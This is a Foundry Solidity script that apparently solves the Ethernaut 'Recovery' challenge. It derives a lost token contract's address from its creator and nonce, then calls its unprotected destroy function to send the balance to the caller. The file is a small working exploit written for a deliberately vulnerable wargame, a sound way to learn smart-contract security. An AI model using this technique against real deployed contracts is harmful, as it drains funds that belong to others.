// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Recovery.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract RecoverySolution is Script {
    Recovery constant recoveryInstance =
        Recovery(0xe8B5CedB31aeCFE8dd647d6E6d84D8743Db5c9bB);

    SimpleToken constant simpleTokenInstance =
        SimpleToken(
            payable(
                address(
                    uint160(
                        uint256(
                            keccak256(
                                abi.encodePacked(
                                    bytes1(0xd6),
                                    bytes1(0x94),
                                    address(
                                        0xe8B5CedB31aeCFE8dd647d6E6d84D8743Db5c9bB
                                    ),
                                    bytes1(0x01)
                                )
                            )
                        )
                    )
                )
            )
        );

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        simpleTokenInstance.destroy(payable(vm.envAddress("MY_ADDRESS")));
        vm.stopBroadcast();
    }
}
